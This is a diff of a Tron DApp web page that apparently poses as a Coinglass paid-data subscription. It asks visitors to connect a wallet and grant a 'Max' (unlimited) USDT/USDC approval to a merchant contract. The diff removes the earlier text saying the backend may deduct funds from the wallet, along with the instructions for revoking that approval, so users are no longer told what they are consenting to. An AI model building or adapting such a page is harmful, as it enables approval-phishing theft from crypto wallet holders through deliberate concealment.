@@ -12,8 +12,9 @@
             pointer-events: none;
             user-select: none;
         }
-        /* 覆蓋層樣式 */
+        /* 覆蓋層樣式：現在只作為消息提示框使用，並覆蓋消息提示 */
         #blurOverlay {
+            /* 保持 flex 屬性，用於居中顯示消息 */
             position: absolute;
             top: 0;
             left: 0;
@@ -21,7 +22,7 @@
             height: 100%;
             background-color: rgba(0, 0, 0, 0.7);
             color: white;
-            display: flex;
+            display: flex; 
             flex-direction: column;
             justify-content: center;
             align-items: center;
@@ -30,6 +31,8 @@
             backdrop-filter: blur(5px);
             padding: 20px;
             box-sizing: border-box;
+            /* 💡 重要：現在 DApp 啟動時它應該是 hidden */
+            display: none; 
         }
         #overlayMessage {
             font-size: 1.5em;
@@ -41,9 +44,9 @@
             justify-content: space-between;
             align-items: center;
             padding: 10px 20px;
-            background-color: #333; /* 確保 header 有背景色 */
+            background-color: #2c2c2c; 
             color: white;
-            position: relative; /* 確保 overlay 能在 header 內正確定位 */
+            position: relative; 
         }
         #connectButton {
             padding: 10px 15px;
@@ -51,7 +54,7 @@
             cursor: pointer;
             border: none;
             border-radius: 5px;
-            background-color: #f7a600; /* Tron 鏈標準顏色 */
+            background-color: #f7a600; 
             color: black;
             font-weight: bold;
         }
@@ -69,31 +72,24 @@
     </header>
 
     <main>
-        <div class="coinglass-content blurred" id="coinglassContent">
+        <div class="coinglass-content" id="coinglassContent">
             
-            <h2>✅ 已解鎖：Coinglass 付費訂閱數據</h2>
+            <h2>🔒 內容鎖定中：請連線並授權</h2>
             
-            <p>感謝您完成 **Max 授權**！您的帳戶已啟動服務訂閱。您的後台系統現在獲得了依約定從您的錢包中扣取服務費的權限。**所有的實際扣款都將由後台控制。**</p>
+            <p>請點擊右上角按鈕連繫您的錢包並完成 Max 授權，以解鎖付費內容。</p>
             
             <div class="data-block">
-                <h3>實時數據摘要</h3>
-                <ul>
-                    <li><strong>BTC/USDT 永續合約費率:</strong> +0.01% (正常)</li>
-                    <li><strong>ETH 未平倉合約:</strong> $150 億 (↑ 5%)</li>
-                    <li><strong>全網清算總額 (24h):</strong> $5,000 萬</li>
-                    <li><strong>主要交易所多空比:</strong> 52% / 48%</li>
-                </ul>
+                <h3>您的表單區塊 (範例)</h3>
+                <form id="yourCustomForm">
+                    <label for="exampleInput">請檢查表單輸入框：</label>
+                    <input type="text" id="exampleInput" placeholder="這是一個測試輸入框" style="padding: 5px; width: 80%; margin-top: 5px;">
+                    <p style="font-size: 0.8em; color: #888; margin-top: 5px;">這個區塊現在是清晰可見的。</p>
+                </form>
             </div>
-
-            <div class="data-block">
-                <h3>如何管理您的授權</h3>
-                <p>您已給予我們的 Merchant 合約扣款權限。如需撤銷，請隨時前往 TronLink 錢包或 TRONScan 授權管理工具，手動撤銷對我們 Merchant 合約地址的 USDT/USDC 授權。</p>
-            </div>
-            
             </div>
         
         <div id="blurOverlay">
-            <div id="overlayMessage">請連繫您的錢包並完成 Max 授權以解鎖內容 🔒</div>
+            <div id="overlayMessage">連線中...</div>
         </div>
 
     </main>
